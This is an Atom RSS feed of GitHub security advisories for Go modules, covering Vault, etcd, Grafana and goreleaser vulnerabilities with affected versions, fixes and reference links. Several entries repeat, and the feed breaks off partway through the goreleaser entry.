<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2024-01-31T01:22:21.924Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/vault/vault] HashiCorp Vault Authentication bypass]]></title>
        <id>https://github.com/advisories/GHSA-4mp7-2m29-gqxf</id>
        <link href="https://github.com/advisories/GHSA-4mp7-2m29-gqxf"/>
        <updated>2024-01-31T00:22:00.000Z</updated>
        <content type="html"><![CDATA[<p>HashiCorp Vault and Vault Enterprise versions 0.8.3 and newer, when configured with the GCP GCE auth method, may be vulnerable to authentication bypass. Fixed in 1.2.5, 1.3.8, 1.4.4, and 1.5.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-16251">https://nvd.nist.gov/vuln/detail/CVE-2020-16251</a></li>
<li><a href="https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#151">https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#151</a></li>
<li><a href="https://www.hashicorp.com/blog/category/vault/">https://www.hashicorp.com/blog/category/vault/</a></li>
<li><a href="http://packetstormsecurity.com/files/159479/Hashicorp-Vault-GCP-IAM-Integration-Authentication-Bypass.html">http://packetstormsecurity.com/files/159479/Hashicorp-Vault-GCP-IAM-Integration-Authentication-Bypass.html</a></li>
<li><a href="https://github.com/advisories/GHSA-4mp7-2m29-gqxf">https://github.com/advisories/GHSA-4mp7-2m29-gqxf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4mp7-2m29-gqxf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-01-31T00:21:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/vault/vault] HashiCorp Vault Authentication bypass]]></title>
        <id>https://github.com/advisories/GHSA-4mp7-2m29-gqxf</id>
        <link href="https://github.com/advisories/GHSA-4mp7-2m29-gqxf"/>
        <updated>2024-01-31T00:22:00.000Z</updated>
        <content type="html"><![CDATA[<p>HashiCorp Vault and Vault Enterprise versions 0.8.3 and newer, when configured with the GCP GCE auth method, may be vulnerable to authentication bypass. Fixed in 1.2.5, 1.3.8, 1.4.4, and 1.5.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-16251">https://nvd.nist.gov/vuln/detail/CVE-2020-16251</a></li>
<li><a href="https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#151">https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#151</a></li>
<li><a href="https://www.hashicorp.com/blog/category/vault/">https://www.hashicorp.com/blog/category/vault/</a></li>
<li><a href="http://packetstormsecurity.com/files/159479/Hashicorp-Vault-GCP-IAM-Integration-Authentication-Bypass.html">http://packetstormsecurity.com/files/159479/Hashicorp-Vault-GCP-IAM-Integration-Authentication-Bypass.html</a></li>
<li><a href="https://github.com/advisories/GHSA-4mp7-2m29-gqxf">https://github.com/advisories/GHSA-4mp7-2m29-gqxf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4mp7-2m29-gqxf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-01-31T00:21:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/vault/vault] HashiCorp Vault Authentication bypass]]></title>
        <id>https://github.com/advisories/GHSA-4mp7-2m29-gqxf</id>
        <link href="https://github.com/advisories/GHSA-4mp7-2m29-gqxf"/>
        <updated>2024-01-31T00:22:00.000Z</updated>
        <content type="html"><![CDATA[<p>HashiCorp Vault and Vault Enterprise versions 0.8.3 and newer, when configured with the GCP GCE auth method, may be vulnerable to authentication bypass. Fixed in 1.2.5, 1.3.8, 1.4.4, and 1.5.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-16251">https://nvd.nist.gov/vuln/detail/CVE-2020-16251</a></li>
<li><a href="https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#151">https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#151</a></li>
<li><a href="https://www.hashicorp.com/blog/category/vault/">https://www.hashicorp.com/blog/category/vault/</a></li>
<li><a href="http://packetstormsecurity.com/files/159479/Hashicorp-Vault-GCP-IAM-Integration-Authentication-Bypass.html">http://packetstormsecurity.com/files/159479/Hashicorp-Vault-GCP-IAM-Integration-Authentication-Bypass.html</a></li>
<li><a href="https://github.com/advisories/GHSA-4mp7-2m29-gqxf">https://github.com/advisories/GHSA-4mp7-2m29-gqxf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4mp7-2m29-gqxf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-01-31T00:21:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/vault/vault] HashiCorp Vault Authentication bypass]]></title>
        <id>https://github.com/advisories/GHSA-4mp7-2m29-gqxf</id>
        <link href="https://github.com/advisories/GHSA-4mp7-2m29-gqxf"/>
        <updated>2024-01-31T00:22:00.000Z</updated>
        <content type="html"><![CDATA[<p>HashiCorp Vault and Vault Enterprise versions 0.8.3 and newer, when configured with the GCP GCE auth method, may be vulnerable to authentication bypass. Fixed in 1.2.5, 1.3.8, 1.4.4, and 1.5.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-16251">https://nvd.nist.gov/vuln/detail/CVE-2020-16251</a></li>
<li><a href="https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#151">https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#151</a></li>
<li><a href="https://www.hashicorp.com/blog/category/vault/">https://www.hashicorp.com/blog/category/vault/</a></li>
<li><a href="http://packetstormsecurity.com/files/159479/Hashicorp-Vault-GCP-IAM-Integration-Authentication-Bypass.html">http://packetstormsecurity.com/files/159479/Hashicorp-Vault-GCP-IAM-Integration-Authentication-Bypass.html</a></li>
<li><a href="https://github.com/advisories/GHSA-4mp7-2m29-gqxf">https://github.com/advisories/GHSA-4mp7-2m29-gqxf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4mp7-2m29-gqxf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-01-31T00:21:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[go.etcd.io/etcd] Etcd Gateway TLS authentication only applies to endpoints detected in DNS SRV records]]></title>
        <id>https://github.com/advisories/GHSA-wr2v-9rpq-c35q</id>
        <link href="https://github.com/advisories/GHSA-wr2v-9rpq-c35q"/>
        <updated>2024-01-31T00:22:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="vulnerability-type">Vulnerability type</h3>
<p>Cryptography</p>
<h3 id="workarounds">Workarounds</h3>
<p>Refer to the <a href="https://github.com/etcd-io/etcd/blob/master/Documentation/op-guide/gateway.md">gateway documentation</a>. The vulnerability was spotted due to unclear documentation of how the gateway handles endpoints validation.</p>
<h3 id="detail">Detail</h3>
<p>When starting a gateway, TLS authentication will only be attempted on endpoints identified in DNS SRV records for a given domain, which occurs in the discoverEndpoints function. No authentication is performed against endpoints provided in the --endpoints flag. The auditors has noted that appropriate documentation of this validation functionality plus deprecation of this misleading functionality is an acceptable path forward.</p>
<h3 id="references">References</h3>
<p>Find out more on this vulnerability in the <a href="https://github.com/etcd-io/etcd/blob/master/security/SECURITY_AUDIT.pdf">security audit report</a></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Contact the <a href="https://github.com/etcd-io/etcd/blob/master/security/security-release-process.md#product-security-committee-psc">etcd security committee</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/etcd-io/etcd/security/advisories/GHSA-wr2v-9rpq-c35q">https://github.com/etcd-io/etcd/security/advisories/GHSA-wr2v-9rpq-c35q</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-15136">https://nvd.nist.gov/vuln/detail/CVE-2020-15136</a></li>
<li><a href="https://github.com/etcd-io/etcd/blob/master/Documentation/op-guide/gateway.md">https://github.com/etcd-io/etcd/blob/master/Documentation/op-guide/gateway.md</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/L6B6R43Y7M3DCHWK3L3UVGE2K6WWECMP/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/L6B6R43Y7M3DCHWK3L3UVGE2K6WWECMP/</a></li>
<li><a href="https://github.com/advisories/GHSA-wr2v-9rpq-c35q">https://github.com/advisories/GHSA-wr2v-9rpq-c35q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wr2v-9rpq-c35q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-01-31T00:21:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[go.etcd.io/etcd] Etcd Gateway TLS authentication only applies to endpoints detected in DNS SRV records]]></title>
        <id>https://github.com/advisories/GHSA-wr2v-9rpq-c35q</id>
        <link href="https://github.com/advisories/GHSA-wr2v-9rpq-c35q"/>
        <updated>2024-01-31T00:22:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="vulnerability-type">Vulnerability type</h3>
<p>Cryptography</p>
<h3 id="workarounds">Workarounds</h3>
<p>Refer to the <a href="https://github.com/etcd-io/etcd/blob/master/Documentation/op-guide/gateway.md">gateway documentation</a>. The vulnerability was spotted due to unclear documentation of how the gateway handles endpoints validation.</p>
<h3 id="detail">Detail</h3>
<p>When starting a gateway, TLS authentication will only be attempted on endpoints identified in DNS SRV records for a given domain, which occurs in the discoverEndpoints function. No authentication is performed against endpoints provided in the --endpoints flag. The auditors has noted that appropriate documentation of this validation functionality plus deprecation of this misleading functionality is an acceptable path forward.</p>
<h3 id="references">References</h3>
<p>Find out more on this vulnerability in the <a href="https://github.com/etcd-io/etcd/blob/master/security/SECURITY_AUDIT.pdf">security audit report</a></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Contact the <a href="https://github.com/etcd-io/etcd/blob/master/security/security-release-process.md#product-security-committee-psc">etcd security committee</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/etcd-io/etcd/security/advisories/GHSA-wr2v-9rpq-c35q">https://github.com/etcd-io/etcd/security/advisories/GHSA-wr2v-9rpq-c35q</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-15136">https://nvd.nist.gov/vuln/detail/CVE-2020-15136</a></li>
<li><a href="https://github.com/etcd-io/etcd/blob/master/Documentation/op-guide/gateway.md">https://github.com/etcd-io/etcd/blob/master/Documentation/op-guide/gateway.md</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/L6B6R43Y7M3DCHWK3L3UVGE2K6WWECMP/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/L6B6R43Y7M3DCHWK3L3UVGE2K6WWECMP/</a></li>
<li><a href="https://github.com/advisories/GHSA-wr2v-9rpq-c35q">https://github.com/advisories/GHSA-wr2v-9rpq-c35q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wr2v-9rpq-c35q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-01-31T00:21:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[go.etcd.io/etcd] Etcd Gateway can include itself as an endpoint resulting in resource exhaustion]]></title>
        <id>https://github.com/advisories/GHSA-2xhq-gv6c-p224</id>
        <link href="https://github.com/advisories/GHSA-2xhq-gv6c-p224"/>
        <updated>2024-01-31T00:21:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="vulnerability-type">Vulnerability type</h3>
<p>Denial of Service</p>
<h3 id="detail">Detail</h3>
<p>The etcd gateway is a simple TCP proxy to allow for basic service discovery and access. However, it is possible to include the gateway address as an endpoint. This results in a denial of service, since the endpoint can become stuck in a loop of requesting itself until there are no more available file descriptors to accept connections on the gateway.</p>
<h3 id="references">References</h3>
<p>Find out more on this vulnerability in the <a href="https://github.com/etcd-io/etcd/blob/master/security/SECURITY_AUDIT.pdf">security audit report</a></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Contact the <a href="https://github.com/etcd-io/etcd/blob/master/security/security-release-process.md#product-security-committee-psc">etcd security committee</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/etcd-io/etcd/security/advisories/GHSA-2xhq-gv6c-p224">https://github.com/etcd-io/etcd/security/advisories/GHSA-2xhq-gv6c-p224</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-15114">https://nvd.nist.gov/vuln/detail/CVE-2020-15114</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/L6B6R43Y7M3DCHWK3L3UVGE2K6WWECMP/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/L6B6R43Y7M3DCHWK3L3UVGE2K6WWECMP/</a></li>
<li><a href="https://github.com/advisories/GHSA-2xhq-gv6c-p224">https://github.com/advisories/GHSA-2xhq-gv6c-p224</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2xhq-gv6c-p224</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-01-31T00:21:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[go.etcd.io/etcd] Etcd Gateway can include itself as an endpoint resulting in resource exhaustion]]></title>
        <id>https://github.com/advisories/GHSA-2xhq-gv6c-p224</id>
        <link href="https://github.com/advisories/GHSA-2xhq-gv6c-p224"/>
        <updated>2024-01-31T00:21:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="vulnerability-type">Vulnerability type</h3>
<p>Denial of Service</p>
<h3 id="detail">Detail</h3>
<p>The etcd gateway is a simple TCP proxy to allow for basic service discovery and access. However, it is possible to include the gateway address as an endpoint. This results in a denial of service, since the endpoint can become stuck in a loop of requesting itself until there are no more available file descriptors to accept connections on the gateway.</p>
<h3 id="references">References</h3>
<p>Find out more on this vulnerability in the <a href="https://github.com/etcd-io/etcd/blob/master/security/SECURITY_AUDIT.pdf">security audit report</a></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Contact the <a href="https://github.com/etcd-io/etcd/blob/master/security/security-release-process.md#product-security-committee-psc">etcd security committee</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/etcd-io/etcd/security/advisories/GHSA-2xhq-gv6c-p224">https://github.com/etcd-io/etcd/security/advisories/GHSA-2xhq-gv6c-p224</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-15114">https://nvd.nist.gov/vuln/detail/CVE-2020-15114</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/L6B6R43Y7M3DCHWK3L3UVGE2K6WWECMP/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/L6B6R43Y7M3DCHWK3L3UVGE2K6WWECMP/</a></li>
<li><a href="https://github.com/advisories/GHSA-2xhq-gv6c-p224">https://github.com/advisories/GHSA-2xhq-gv6c-p224</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2xhq-gv6c-p224</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-01-31T00:21:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/etcd-io/etcd] Improper Preservation of Permissions in etcd]]></title>
        <id>https://github.com/advisories/GHSA-chh6-ppwq-jh92</id>
        <link href="https://github.com/advisories/GHSA-chh6-ppwq-jh92"/>
        <updated>2024-01-30T23:54:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="vulnerability-type">Vulnerability type</h3>
<p>Access Controls</p>
<h3 id="detail">Detail</h3>
<p>etcd creates certain directory paths (etcd data directory and the directory path when provided to automatically generate self-signed certificates for TLS connections with clients) with restricted access permissions (700) by using the os.MkdirAll. This function does not perform any permission checks when a given directory path exists already.</p>
<h3 id="specific-go-package-affected">Specific Go Package Affected</h3>
<p>github.com/etcd-io/etcd/pkg/fileutil</p>
<h3 id="workarounds">Workarounds</h3>
<p>Make sure these directories have the desired permit (700).</p>
<h3 id="references">References</h3>
<p>Find out more on this vulnerability in the <a href="https://github.com/etcd-io/etcd/blob/master/security/SECURITY_AUDIT.pdf">security audit report</a></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Contact the <a href="https://github.com/etcd-io/etcd/blob/master/security/security-release-process.md#product-security-committee-psc">etcd security committee</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/etcd-io/etcd/security/advisories/GHSA-chh6-ppwq-jh92">https://github.com/etcd-io/etcd/security/advisories/GHSA-chh6-ppwq-jh92</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-15113">https://nvd.nist.gov/vuln/detail/CVE-2020-15113</a></li>
<li><a href="https://github.com/etcd-io/etcd/commit/6be5c54c94298ae6746a574d2af8227d0c9a998b">https://github.com/etcd-io/etcd/commit/6be5c54c94298ae6746a574d2af8227d0c9a998b</a></li>
<li><a href="https://github.com/etcd-io/etcd/commit/e5424fc474b274c9e6b5205165015bc2035745f2">https://github.com/etcd-io/etcd/commit/e5424fc474b274c9e6b5205165015bc2035745f2</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/L6B6R43Y7M3DCHWK3L3UVGE2K6WWECMP/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/L6B6R43Y7M3DCHWK3L3UVGE2K6WWECMP/</a></li>
<li><a href="https://github.com/advisories/GHSA-chh6-ppwq-jh92">https://github.com/advisories/GHSA-chh6-ppwq-jh92</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-chh6-ppwq-jh92</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-01-30T23:54:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/etcd-io/etcd] Improper Preservation of Permissions in etcd]]></title>
        <id>https://github.com/advisories/GHSA-chh6-ppwq-jh92</id>
        <link href="https://github.com/advisories/GHSA-chh6-ppwq-jh92"/>
        <updated>2024-01-30T23:54:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="vulnerability-type">Vulnerability type</h3>
<p>Access Controls</p>
<h3 id="detail">Detail</h3>
<p>etcd creates certain directory paths (etcd data directory and the directory path when provided to automatically generate self-signed certificates for TLS connections with clients) with restricted access permissions (700) by using the os.MkdirAll. This function does not perform any permission checks when a given directory path exists already.</p>
<h3 id="specific-go-package-affected">Specific Go Package Affected</h3>
<p>github.com/etcd-io/etcd/pkg/fileutil</p>
<h3 id="workarounds">Workarounds</h3>
<p>Make sure these directories have the desired permit (700).</p>
<h3 id="references">References</h3>
<p>Find out more on this vulnerability in the <a href="https://github.com/etcd-io/etcd/blob/master/security/SECURITY_AUDIT.pdf">security audit report</a></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Contact the <a href="https://github.com/etcd-io/etcd/blob/master/security/security-release-process.md#product-security-committee-psc">etcd security committee</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/etcd-io/etcd/security/advisories/GHSA-chh6-ppwq-jh92">https://github.com/etcd-io/etcd/security/advisories/GHSA-chh6-ppwq-jh92</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-15113">https://nvd.nist.gov/vuln/detail/CVE-2020-15113</a></li>
<li><a href="https://github.com/etcd-io/etcd/commit/6be5c54c94298ae6746a574d2af8227d0c9a998b">https://github.com/etcd-io/etcd/commit/6be5c54c94298ae6746a574d2af8227d0c9a998b</a></li>
<li><a href="https://github.com/etcd-io/etcd/commit/e5424fc474b274c9e6b5205165015bc2035745f2">https://github.com/etcd-io/etcd/commit/e5424fc474b274c9e6b5205165015bc2035745f2</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/L6B6R43Y7M3DCHWK3L3UVGE2K6WWECMP/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/L6B6R43Y7M3DCHWK3L3UVGE2K6WWECMP/</a></li>
<li><a href="https://github.com/advisories/GHSA-chh6-ppwq-jh92">https://github.com/advisories/GHSA-chh6-ppwq-jh92</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-chh6-ppwq-jh92</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-01-30T23:54:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/grafana/grafana] Grafana XSS via adding a link in General feature]]></title>
        <id>https://github.com/advisories/GHSA-6wh2-8hw7-jw94</id>
        <link href="https://github.com/advisories/GHSA-6wh2-8hw7-jw94"/>
        <updated>2024-01-30T23:47:51.000Z</updated>
        <content type="html"><![CDATA[<p>Grafana 5.3.1 has XSS via a link on the "Dashboard &gt; All Panels &gt; General" screen. NOTE: this issue exists because of an incomplete fix for CVE-2018-12099.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-18625">https://nvd.nist.gov/vuln/detail/CVE-2018-18625</a></li>
<li><a href="https://github.com/grafana/grafana/pull/11813">https://github.com/grafana/grafana/pull/11813</a></li>
<li><a href="https://github.com/grafana/grafana/pull/14984">https://github.com/grafana/grafana/pull/14984</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20200608-0008/">https://security.netapp.com/advisory/ntap-20200608-0008/</a></li>
<li><a href="https://github.com/advisories/GHSA-6wh2-8hw7-jw94">https://github.com/advisories/GHSA-6wh2-8hw7-jw94</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6wh2-8hw7-jw94</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-01-30T23:47:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/grafana/grafana] Grafana XSS in Dashboard Text Panel]]></title>
        <id>https://github.com/advisories/GHSA-cmq2-j8v8-2q44</id>
        <link href="https://github.com/advisories/GHSA-cmq2-j8v8-2q44"/>
        <updated>2024-01-30T23:47:49.000Z</updated>
        <content type="html"><![CDATA[<p>Grafana 5.3.1 has XSS via the "Dashboard &gt; Text Panel" screen. NOTE: this issue exists because of an incomplete fix for CVE-2018-12099.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-18623">https://nvd.nist.gov/vuln/detail/CVE-2018-18623</a></li>
<li><a href="https://github.com/grafana/grafana/issues/15293">https://github.com/grafana/grafana/issues/15293</a></li>
<li><a href="https://github.com/grafana/grafana/issues/4117">https://github.com/grafana/grafana/issues/4117</a></li>
<li><a href="https://github.com/grafana/grafana/pull/11813">https://github.com/grafana/grafana/pull/11813</a></li>
<li><a href="https://github.com/grafana/grafana/pull/14984">https://github.com/grafana/grafana/pull/14984</a></li>
<li><a href="https://github.com/grafana/grafana/releases/tag/v6.0.0">https://github.com/grafana/grafana/releases/tag/v6.0.0</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20200608-0008/">https://security.netapp.com/advisory/ntap-20200608-0008/</a></li>
<li><a href="https://github.com/advisories/GHSA-cmq2-j8v8-2q44">https://github.com/advisories/GHSA-cmq2-j8v8-2q44</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cmq2-j8v8-2q44</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-01-30T23:47:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/vault/vault] HashiCorp Vault Improper Privilege Management]]></title>
        <id>https://github.com/advisories/GHSA-m979-w9wj-qfj9</id>
        <link href="https://github.com/advisories/GHSA-m979-w9wj-qfj9"/>
        <updated>2024-01-30T23:40:45.000Z</updated>
        <content type="html"><![CDATA[<p>HashiCorp Vault and Vault Enterprise versions 0.9.0 through 1.3.3 may, under certain circumstances, have an Entity's Group membership inadvertently include Groups the Entity no longer has permissions to. Fixed in 1.3.4.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-10660">https://nvd.nist.gov/vuln/detail/CVE-2020-10660</a></li>
<li><a href="https://github.com/hashicorp/vault/pull/8606">https://github.com/hashicorp/vault/pull/8606</a></li>
<li><a href="https://github.com/hashicorp/vault/commit/18485ee9d4352ac8e8396c580b5941ccf8e5b31a">https://github.com/hashicorp/vault/commit/18485ee9d4352ac8e8396c580b5941ccf8e5b31a</a></li>
<li><a href="https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#134-march-19th-2020">https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#134-march-19th-2020</a></li>
<li><a href="https://www.hashicorp.com/blog/category/vault/">https://www.hashicorp.com/blog/category/vault/</a></li>
<li><a href="https://github.com/advisories/GHSA-m979-w9wj-qfj9">https://github.com/advisories/GHSA-m979-w9wj-qfj9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m979-w9wj-qfj9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-01-30T23:40:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/vault/vault] HashiCorp Vault Improper Privilege Management]]></title>
        <id>https://github.com/advisories/GHSA-j6vv-vv26-rh7c</id>
        <link href="https://github.com/advisories/GHSA-j6vv-vv26-rh7c"/>
        <updated>2024-01-30T23:40:41.000Z</updated>
        <content type="html"><![CDATA[<p>HashiCorp Vault and Vault Enterprise versions 0.11.0 through 1.3.3 may, under certain circumstances, have existing nested-path policies grant access to Namespaces created after-the-fact. Fixed in 1.3.4.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-10661">https://nvd.nist.gov/vuln/detail/CVE-2020-10661</a></li>
<li><a href="https://github.com/hashicorp/vault/commit/18485ee9d4352ac8e8396c580b5941ccf8e5b31a">https://github.com/hashicorp/vault/commit/18485ee9d4352ac8e8396c580b5941ccf8e5b31a</a></li>
<li><a href="https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#134-march-19th-2020">https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#134-march-19th-2020</a></li>
<li><a href="https://www.hashicorp.com/blog/category/vault/">https://www.hashicorp.com/blog/category/vault/</a></li>
<li><a href="https://github.com/advisories/GHSA-j6vv-vv26-rh7c">https://github.com/advisories/GHSA-j6vv-vv26-rh7c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j6vv-vv26-rh7c</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-01-30T23:40:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/goreleaser/goreleaser] `goreleaser release --debug` shows secrets]]></title>
        <id>https://github.com/advisories/GHSA-h3q2-8whx-c29h</id>
        <link href="https://github.com/advisories/GHSA-h3q2-8whx-c29h"/>
        <updated>2024-01-30T20:57:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Hello 👋 </p>
<p><code>goreleaser release --debug</code> log shows secret values used in the in the custom publisher.</p>
<p>How to reproduce the issue:</p>
<ul>
<li>Define a custom publisher as the one below. Make sure to provide a custom script to the <code>cmd</code> field and to provide a secret to <code>env</code></li>
</ul>
<pre><code>#.goreleaser.yml 
publishers:
  - name: my-publisher
  # IDs of the artifacts we want to sign
    ids:
      - linux_archives
      - linux_package
    cmd: "./build/package/linux_notarize.sh"
    env:
      - VERSION={{ .Version }}
      - SECRET_1={{.Env.SECRET_1}}
      - SECRET_2={{.Env.SECRET_2}}
</code></pre>
<ul>
<li>run <code>goreleaser release --debug</code></li>
</ul>
<p>You should see your secret value in the gorelease log. The log shows also the <code>GITHUB_TOKEN</code></p>
<p>Example:</p>
<pre><code>running                                        cmd= ....
SECRET_1=secret_value
</code></pre>
<h3 id="references">References</h3>
<ul>
